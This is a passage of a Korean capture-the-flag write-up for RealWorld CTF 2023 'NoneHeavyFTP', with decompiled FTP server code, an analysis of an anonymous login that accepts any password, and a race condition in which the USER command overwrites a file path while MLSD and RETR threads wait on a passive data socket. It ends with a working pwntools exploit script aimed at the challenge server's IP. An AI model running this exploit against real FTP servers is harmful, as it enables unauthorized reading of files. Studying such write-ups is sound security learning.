arguments.\\r\\n\", 0x2EuLL, 0x4000) \u003e= 0; } memset(v5, 0, 0x100uLL); if ( !(unsigned int)config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \"pswd\", v5, (char *)\u0026qword_100)// a, pswd, || strcmp(v5, password) \u0026\u0026 v5[0] != '*' ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u003e= 0; return send(*(_DWORD *)(a1 + 40), \"530 Invalid user name or password.\\r\\n\", 0x24uLL, 0x4000) \u003e= 0; } *(_QWORD *)(a1 + 0x1078) = 0LL; *(_QWORD *)(a1 + 0x2070) = 0LL; memset( (void *)((a1 + 0x1080) \u0026 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * (((_DWORD)a1 + 0x1078 - (((_DWORD)a1 + 0x1080) \u0026 0xFFFFFFF8) + 4096) \u003e\u003e 3)); memset(v5, 0, 0x100uLL); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \"root\", (_BYTE *)(a1 + 0x1078), \"a\"); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \"accs\", v5, (char *)\u0026qword_100); *(_DWORD *)(a1 + 88) = 0; if ( !strcasecmp(v5, \"admin\") ) { v2 = 3; LABEL_7: *(_DWORD *)(a1 + 0x58) = v2; writelogentry(a1, (__int64)\" PASS-\u003esuccessful logon\", (__int64)\"\"); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u003e= 0; return send(*(_DWORD *)(a1 + 40), \"230 User logged in, proceed.\\r\\n\", 0x1EuLL, 0x4000) \u003e= 0; } if ( !strcasecmp(v5, \"upload\") ) { v2 = 2; goto LABEL_7; } v3 = strcasecmp(v5, \"readonly\"); v2 = 1; if ( !v3 ) goto LABEL_7; if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u003e= 0; return send(*(_DWORD *)(a1 + 40), \"530 This account is disabled.\\r\\n\", 0x1FuLL, 0x4000) \u003e= 0; } PASS 함수이다. config 파일에서 유저의 비밀번호를 찾고 인증한다. *면 어떤 비밀번호여도 체크가 패스된다. 아까 config 파일에서 있던 anonymous를 유저 이름으로 주고, 아무 비밀번호나 입력하면, ReadOnly 권한으로 ftp 서버에 접속할 수 있다.\n이제 flag 이름을 읽기 위해서 ftp 명령어들을 구글링 해봤다. MLSD가 나와서 그걸 분석해봤다.\n__int64 __fastcall ftpMLSD(pthread_mutex_t *mutex, char *a2) { int owner; // edx int v4; // eax __int64 align; // rdi int v7; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v9; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v10; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v10 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \"530 Please login with USER and PASS.\\r\\n\", 0x26uLL, 0x4000) \u003e= 0; return gnutls_record_send() \u003e= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \"550 Another action is in progress, use ABOR command first.\\r\\n\", 0x3CuLL, 0x4000) \u003e= 0; return gnutls_record_send() \u003e= 0; } ftp_effective_path((__int64)(\u0026mutex[105].__align + 2), (__int64)\u0026mutex[3], a2, 0x2000uLL, \u0026mutex[310].__size[8]); v4 = stat64(\u0026mutex[310].__size[8], \u0026v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026\u0026 (v9.st_mode \u0026 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \"150 File status okay; about to open data connection.\\r\\n\", 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\" MLSD-LIST \", (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mutex[1].__kind = v7; if ( v7 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \"451 Requested action aborted. Local error in processing.\\r\\n\", 0x3AuLL, 0x4000); } else { *(\u0026mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } else if ( align ) { return gnutls_record_send() \u003e= 0; } else { return send(mutex[1].__lock, \"550 File or directory unavailable.\\r\\n\", 0x24uLL, 0x4000) \u003e= 0; } } mutex로 critical section을 하나의 쓰레드만 진입하도록 해준것 같다. ftp_effective_path 함수로 경로를 얻어오고 stat으로 체크한다. 여기서 쓰레드로 mlsd_thread 함수를 호출한다. 첫번째 인자는 mutex 그대로 넘겨준다.\nvoid *__fastcall mlsd_thread(pthread_mutex_t *a1) { int v1; // ebx DIR *v2; // rbp struct dirent64 *v3; // rcx __int64 align; // rdi pthread_mutex_t *v5; // rbx _BYTE fd[12]; // [rsp+14h] [rbp-94h] BYREF __pthread_unwind_buf_t buf; // [rsp+20h] [rbp-88h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026buf); } v1 = 0; __pthread_register_cancel(\u0026buf); *(_DWORD *)\u0026fd[8] = 0; *(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } } if ( *(_QWORD *)\u0026fd[4] ) { gnutls_bye(*(_QWORD *)\u0026fd[4], 0LL); gnutls_deinit(); } } writelogentry((__int64)a1, (__int64)\" MLSD complete\", (__int64)\"\"); align = a1[515].__align; if ( *(_DWORD *)fd != -1 ) { if ( !a1[1].__spins \u0026\u0026 v1 ) { if ( !align ) { send(a1[1].__lock, \"226 Transfer complete. Closing data connection.\\r\\n\", 0x31uLL, 0x4000); goto LABEL_18; } } else if ( !align ) { send(a1[1].__lock, \"426 Connection closed; transfer aborted.\\r\\n\", 0x2AuLL, 0x4000); goto LABEL_18; } gnutls_record_send(); LABEL_18: close(*(int *)fd); a1[1].__count = -1; v5 = a1; goto LABEL_19; } if ( align ) gnutls_record_send(); else send(a1[1].__lock, \"451 Requested action aborted. Local error in processing.\\r\\n\", 0x3AuLL, 0x4000); v5 = a1; LABEL_19: v5[1].__kind = -1; __pthread_unregister_cancel(\u0026buf); pthread_mutex_unlock(v5); return 0LL; } create_datasocket으로 데이터 소켓을 따로 연다. 그리고 opendir, readdir을 해주고 datasocket으로 결과를 보내준다.\n__int64 __fastcall mlsd_sub(__int64 a1, int a2, __int64 a3, _BYTE *a4) { __int64 result; // rax size_t v6; // rdx struct tm v7; // [rsp+0h] [rbp-2118h] BYREF struct stat64 v8; // [rsp+40h] [rbp-20D8h] BYREF char file[24]; // [rsp+D0h] [rbp-2048h] BYREF unsigned __int64 v10; // [rsp+20D8h] [rbp-40h] v10 = __readfsqword(0x28u); if ( a4[19] != 46 || (result = 1LL, a4[20]) ) { if ( a4[19] != 46 || a4[20] != 46 || (result = 1LL, a4[21]) ) { __snprintf_chk((__int64)file, 0x2000LL, 1LL, 0x2000LL, \"%s/%s\"); if ( !lstat64(file, \u0026v8) ) { localtime_r(\u0026v8.st_mtim.tv_sec, \u0026v7); ++v7.tm_mon; __snprintf_chk( (__int64)file, 0x2000LL, 1LL, 0x2000LL, \"type=%s;%s=%llu;UNIX.mode=%lo;UNIX.owner=%lu;UNIX.group=%lu;modify=%u%02u%02u%02u%02u%02u; %s\\r\\n\"); } v6 = strlen(file); if ( a3 ) return gnutls_record_send() \u003e= 0; else return send(a2, file, v6, 0x4000) \u003e= 0; } } return result; } mlsd_sub 함수가 결과를 보내주는 역할을 한다.\n_BOOL8 __fastcall ftpPASV(__int64 a1) { size_t v1; // rdx if ( *(_DWORD *)(a1 + 88) ) { if ( *(_DWORD *)(a1 + 56) ) { if ( (unsigned int)pasv_part_0() ) { __snprintf_chk(a1 + 12408, 0x2000LL, 1LL, 0x2000LL, \"227 Entering Passive Mode (%u,%u,%u,%u,%u,%u).\\r\\n\"); writelogentry(a1, (__int64)\" entering passive mode\", (__int64)\"\"); v1 = strlen((const char *)(a1 + 12408)); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u003e= 0; else return send(*(_DWORD *)(a1 + 40), (const void *)(a1 + 12408), v1, 0x4000) \u003e= 0; } else { return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \"550 Another action is in progress, use ABOR command first.\\r\\n\", 0x3CuLL, 0x4000); return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \"530 Please login with USER and PASS.\\r\\n\", 0x26uLL, 0x4000); return 1LL; } } ftp 패시브 모드가 구현된 함수다. 포트를 열어주고 유저가 특정 포트로 접속해서 데이터를 받는 형식이다.\n_BOOL8 __fastcall ftpRETR(pthread_mutex_t *mutex, __int64 a2) { int owner; // edx int lock; // edi int v5; // eax __int64 align; // rdi int v8; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v10; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v11; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v11 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \"530 Please login with USER and PASS.\\r\\n\", 0x26uLL, 0x4000) \u003e= 0; return gnutls_record_send() \u003e= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \"550 Another action is in progress, use ABOR command first.\\r\\n\", 0x3CuLL, 0x4000) \u003e= 0; return gnutls_record_send() \u003e= 0; } if ( !a2 ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \"501 Syntax error in parameters or arguments.\\r\\n\", 0x2EuLL, 0x4000) \u003e= 0; return gnutls_record_send() \u003e= 0; } lock = mutex[2].__lock; if ( lock != -1 ) { close(lock); mutex[2].__lock = -1; } ftp_effective_path(\u0026mutex[105].__align + 2, \u0026mutex[3], a2, 0x2000LL, \u0026mutex[310].__align + 1); v5 = stat64(\u0026mutex[310].__size[8], \u0026v10); align = mutex[515].__align; if ( v5 || (v10.st_mode \u0026 0xF000) == 0x4000 ) { if ( align ) return gnutls_record_send() \u003e= 0; else return send(mutex[1].__lock, \"550 File or directory unavailable.\\r\\n\", 0x24uLL, 0x4000) \u003e= 0; } else { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \"150 File status okay; about to open data connection.\\r\\n\", 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\" RETR: \", a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v8 = pthread_create(\u0026newthread, 0LL, retr_thread, mutex); mutex[1].__kind = v8; if ( v8 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \"451 Requested action aborted. Local error in processing.\\r\\n\", 0x3AuLL, 0x4000); } else { *(\u0026mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } } RETR 명령어가 구현된 함수다. 파일을 읽는데 필요하다.\nvoid *__fastcall retr_thread(__int64 a1) { void *v1; // rbp void *max_size; // r13 int v4; // eax int v5; // r12d char v6; // r14 __int64 v7; // rdi __int64 v8; // rbx __int64 v9; // rax signed __int64 v10; // rax signed __int64 v11; // r14 __int64 v13; // [rsp+18h] [rbp-D0h] int fd; // [rsp+24h] [rbp-C4h] __int64 v15; // [rsp+28h] [rbp-C0h] BYREF struct timespec tp; // [rsp+30h] [rbp-B8h] BYREF __pthread_unwind_buf_t buf; // [rsp+40h] [rbp-A8h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock((pthread_mutex_t *)a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026buf, 0) ) { cleanup_handler((pthread_mutex_t *)a1); __pthread_unwind_next(\u0026buf); } __pthread_register_cancel(\u0026buf); v15 = 0LL; clock_gettime(1, \u0026tp); v1 = malloc((size_t)\u0026_data_start); if ( !v1 ) { *(_DWORD *)(a1 + 80) = -1; goto LABEL_26; } fd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u003e \u0026_data_start ) max_size = \u0026_data_start; } else { max_size = \u0026_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; if ( v4 != -1 ) { v6 = 0; if ( *(_QWORD *)(a1 + 104) == lseek64(v4, *(_QWORD *)(a1 + 104), 0) ) { if ( *(_DWORD *)(a1 + 60) ) { v13 = 0LL; v6 = 1; } else { v8 = 0LL; do { v10 = read(v5, v1, (size_t)max_size); v11 = v10; if ( !v10 ) break; if ( v10 \u003e= 0 ) { v9 = v15 ? gnutls_record_send() : send(fd, v1, v10, 0x4000); if ( v11 == v9 ) continue; } v13 = v8; v6 = 0; goto LABEL_41; v8 += v11; } while ( !*(_DWORD *)(a1 + 60) ); v13 = v8; v6 = 1; } LABEL_41: clock_gettime(1, \u0026tp); *(_QWORD *)(a1 + 20616) += v13; ++*(_QWORD *)(a1 + 20632); __snprintf_chk( (char *)v1, (__int64)max_size, 1LL, (__int64)\u0026_data_start, \" RETR complete. %zd bytes (%f MBytes) total sent in %f seconds (%f MBytes/s)\"); writelogentry(a1, (__int64)v1, (__int64)\"\"); } close(v5); *(_DWORD *)(a1 + 0x50) = -1; free(v1); v7 = *(_QWORD *)(a1 + 0x5078); if ( !*(_DWORD *)(a1 + 0x3C) \u0026\u0026 v6 ) { if ( !v7 ) { send(*(_DWORD *)(a1 + 40), \"226 Transfer complete. Closing data connection.\\r\\n\", 0x31uLL, 0x4000); goto LABEL_9; } goto LABEL_8; } LABEL_7: if ( !*(_QWORD *)(a1 + 0x5078) ) { send(*(_DWORD *)(a1 + 40), \"426 Connection closed; transfer aborted.\\r\\n\", 0x2AuLL, 0x4000); goto LABEL_9; } LABEL_8: gnutls_record_send(); LABEL_9: close(fd); *(_DWORD *)(a1 + 44) = -1; goto LABEL_10; } } LABEL_6: *(_DWORD *)(a1 + 80) = -1; free(v1); if ( fd != -1 ) goto LABEL_7; LABEL_26: if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \"451 Requested action aborted. Local error in processing.\\r\\n\", 0x3AuLL, 0x4000); LABEL_10: if ( v15 ) { gnutls_bye(); gnutls_deinit(); } *(_DWORD *)(a1 + 56) = -1; __pthread_unregister_cancel(\u0026buf); pthread_mutex_unlock((pthread_mutex_t *)a1); return 0LL; } 쓰레드로 돌아간다. 다른 함수랑 비슷하게 mutex 걸고 간다. 파일을 읽고 datasocket으로 보내준다.\nftp_effective_path 함수는 소스코드를 읽으면서 분석했다.\nint ftp_normalize_path(char* path, size_t npath_len, char* npath) { char* p0; size_t node_len; int status = 1; pftp_path_node nodes = NULL, newnode; if ((path == NULL) || (npath == NULL) || (npath_len \u003c 2)) return 0; if (*path == '/') { *npath = '/'; ++path; ++npath; --npath_len; } p0 = path; while (*path != 0) { while ((*path != '/') \u0026\u0026 (*path != '\\0')) ++path; node_len = path - p0; while (node_len \u003e 0) { /* we have a \"this dir\" sign: just skip it */ if (strncmp(p0, \".\", node_len) == 0) break; if (strncmp(p0, \"..\", node_len) == 0) { /* we have a \"dir-up\" sign: unlink and free prev node */ if (nodes) { newnode = nodes-\u003eprev; free(nodes); if (newnode) newnode-\u003enext = NULL; nodes = newnode; } } else { newnode = x_malloc(sizeof(ftp_path_node)); newnode-\u003evalue = p0; newnode-\u003elength = node_len; newnode-\u003enext = NULL; newnode-\u003eprev = nodes; if (nodes) nodes-\u003enext = newnode; nodes = newnode; } break; } if (*path != 0) ++path; p0 = path; } /* return to head */ newnode = nodes; while (newnode) { nodes = newnode; newnode = newnode-\u003eprev; } while (nodes) { if (npath_len \u003c nodes-\u003elength + 1) { status = 0; break; } strncpy(npath, nodes-\u003evalue, nodes-\u003elength); npath += nodes-\u003elength; *npath = '/'; ++npath; npath_len -= nodes-\u003elength + 1; newnode = nodes; nodes = newnode-\u003enext; free(newnode); } /* free the remaining nodes in case of break */ while (nodes) { newnode = nodes; nodes = newnode-\u003enext; free(newnode); } if ((npath_len == 0) || (status == 0)) return 0; *npath = '\\0'; return 1; } int ftp_effective_path(char *root_path, char *current_path, char *file_path, size_t result_size, char *result) { char path[PATH_MAX*2], normalized_path[PATH_MAX]; int status; size_t len; memset(result, 0, result_size); if (file_path == NULL) file_path = \"\"; if (*file_path == '/') { status = ftp_normalize_path(file_path, PATH_MAX, normalized_path); } else { snprintf(path, PATH_MAX*2, \"%s/%s\", current_path, file_path); status = ftp_normalize_path(path, PATH_MAX, normalized_path); } if (status == 0) return 0; snprintf(path, PATH_MAX*2, \"%s/%s\", root_path, normalized_path); status = ftp_normalize_path(path, result_size, result); /* delete last slash */ len = strlen(result); if (len \u003e= 2) { if (result[len-1] == '/') result[len-1] = '\\0'; } return status; } 기본적으로 root path와 file path를 마지막에 붙여준다. ..이나 .같은 상대주소 처리도 제대로 구현되어있다.\n분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.\ntypedef struct _FTPCONTEXT { pthread_mutex_t MTLock; SOCKET ControlSocket; SOCKET DataSocket; pthread_t WorkerThreadId; /* * WorkerThreadValid is output of pthread_create * therefore zero is VALID indicator and -1 is invalid. */ int WorkerThreadValid; int WorkerThreadAbort; in_addr_t ServerIPv4; in_addr_t ClientIPv4; in_addr_t DataIPv4; in_port_t DataPort; int File; int Mode; int Access; int SessionID; int DataProtectionLevel; off_t RestPoint; uint64_t BlockSize; char CurrentDir[PATH_MAX]; char RootDir[PATH_MAX]; char RnFrom[PATH_MAX]; char FileName[2*PATH_MAX]; gnutls_session_t TLS_session; SESSION_STATS Stats; } FTPCONTEXT, *PFTPCONTEXT; 함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다. File이나, Access, Mode같은 필드들이 있었다.\nExploitation int ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u003eAccess = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \" USER: \", (char *)params); snprintf(context-\u003eFileName, sizeof(context-\u003eFileName), \"331 User %s OK. Password required\\r\\n\", params); sendstring(context, context-\u003eFileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u003eFileName, params); return 1; } ftpUSER에서 FileName이 덮힌다. ftp_effective_path에서\nsnprintf(path, PATH_MAX*2, \"%s/%s\", root_path, normalized_path); 위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.\nftp_effective_path(context-\u003eRootDir, context-\u003eCurrentDir, params, sizeof(context-\u003eFileName), context-\u003eFileName); while (stat(context-\u003eFileName, \u0026filestats) == 0) { if ( !S_ISDIR(filestats.st_mode) ) break; sendstring(context, interm150); writelogentry(context, \" MLSD-LIST \", (char *)params); context-\u003eWorkerThreadAbort = 0; pthread_mutex_lock(\u0026context-\u003eMTLock); ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-\u003eFileName을 체크하는 것을 알 수 있다. 이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다. 그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다. 그때는 왜 lock 되어있는데 값이 바뀌는지 궁금했지만, 그냥 되길래 익스플로잇 코드를 짰었다.\nmutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다. 만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.\nint ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u003eAccess = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \" USER: \", (char *)params); snprintf(context-\u003eFileName, sizeof(context-\u003eFileName), \"331 User %s OK. Password required\\r\\n\", params); sendstring(context, context-\u003eFileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u003eFileName, params); return 1; } ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.\nftp_effective_path((__int64)(\u0026mutex[105].__align + 2), (__int64)\u0026mutex[3], a2, 0x2000uLL, \u0026mutex[310].__size[8]); v4 = stat64(\u0026mutex[310].__size[8], \u0026v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026\u0026 (v9.st_mode \u0026 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \"150 File status okay; about to open data connection.\\r\\n\", 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\" MLSD-LIST \", (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mlsd_thread를 호출한다. 그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.\nbuf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026buf); } v1 = 0; __pthread_register_cancel(\u0026buf); mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.\n*(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다. 그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.\nfd로 결과를 보내준다. 이걸로 flag의 이름을 알 수 있다.\nfd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u003e \u0026_data_start ) max_size = \u0026_data_start; } else { max_size = \u0026_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; 이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다. 당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.\nSOCKET create_datasocket(PFTPCONTEXT context) { SOCKET\tclientsocket = INVALID_SOCKET; struct sockaddr_in\tladdr; socklen_t\tasz; memset(\u0026laddr, 0, sizeof(laddr)); switch ( context-\u003eMode ) { case MODE_NORMAL: clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); context-\u003eDataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; laddr.sin_family = AF_INET; laddr.sin_port = context-\u003eDataPort; laddr.sin_addr.s_addr = context-\u003eDataIPv4; if ( connect(clientsocket, (const struct sockaddr *)\u0026laddr, sizeof(laddr)) == -1 ) { close(clientsocket); return INVALID_SOCKET; } break; case MODE_PASSIVE: asz = sizeof(laddr); clientsocket = accept(context-\u003eDataSocket, (struct sockaddr *)\u0026laddr, \u0026asz); close(context-\u003eDataSocket); context-\u003eDataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; context-\u003eDataIPv4 = 0; context-\u003eDataPort = 0; context-\u003eMode = MODE_NORMAL; break; default: return INVALID_SOCKET; } return clientsocket; } PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.\nExploit script from pwn import * sa = lambda x,y : p.sendafter(x,y) s = lambda x : p.send(x) rvu = lambda x : p.recvuntil(x) local =False if local==True: ip = '127.0.0.1' mip = b'127,0,0,1' else : ip = '47.89.253.219' mip = b'0,0,0,0' p = remote(ip,2121) context.log_level='debug' pay = b'USER anonymous\\r\\n' sa(b'ready',pay) pay = b'PASS AAAAA\\r\\n' sa(b' OK',pay) pay = b'PASV \\r\\n' sa(b'logged in',pay) pay = b'MLSD /\\r\\n' sa(b'Passive',pay) rvu(mip+b',') recv = rvu(b')')[:-1].split(b',') recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\"nc {ip} {port}\") s(b'USER /\\r\\n') print(\"flag name : \",end='') flag = input() s(b'USER anonymous\\r\\n') sa(b' OK',b'PASS AAAAA\\r\\n') sa(b'logged in',b'PASV \\r\\n') rvu(mip+b',') recv = rvu(b')')[:-1].split(b',') recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\"nc {ip} {port}\") flag = \"/\"+flag pay = b'RETR /hello.txt\\r\\n' s(pay) s(f'USER {flag[:-1]}\\r\\n') p.interactive() nc로 직접 접속해줘야된다. flag 이름 넣어주고 다른 포트로 다시 접속하면 된다. ",
  "wordCount" : "5526",
  "inLanguage": "en",
  "datePublished": "2023-01-07T00:00:00Z",
  "dateModified": "2023-01-07T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      RealWorld CTF 2023 - NoneHeavyFTP
    </h1>
    <div class="post-meta">


January 2023

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#nonheavyftp" aria-label="NonHeavyFTP">NonHeavyFTP</a><ul>
                        
                <li>
